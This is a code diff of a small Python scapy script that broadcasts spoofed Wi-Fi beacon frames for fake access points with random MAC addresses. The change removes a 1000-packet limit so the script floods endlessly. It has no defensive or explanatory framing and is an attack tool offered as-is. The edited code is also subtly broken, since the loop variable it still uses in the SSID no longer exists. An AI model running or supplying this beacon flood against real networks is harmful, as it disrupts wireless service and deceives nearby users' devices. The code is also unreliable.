@@ -2,9 +2,9 @@ import random as rand
 from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp  # type: ignore
 
 IFACE = "wlan0mon"
-TOTAL_DEVICES = 1000
 
-for i in range(TOTAL_DEVICES):
+while True:
+    # step 1: Create the packets
     ssid = f"FAKE_AP_{i}"
     mac = f"02:00:00:{rand.randint(0, 255):02x}:{rand.randint(0, 255):02x}:{rand.randint(0, 255):02x}"  # type: ignore
 
@@ -18,4 +18,4 @@ for i in range(TOTAL_DEVICES):
     # step 2: Send the packets !
     sendp(pkt, iface=IFACE, count=1, verbose=False)
 
-print(f"[*] {TOTAL_DEVICES} fake access points created and broadcasted.")
+print(f"[*] Fake access points created and broadcasted.")
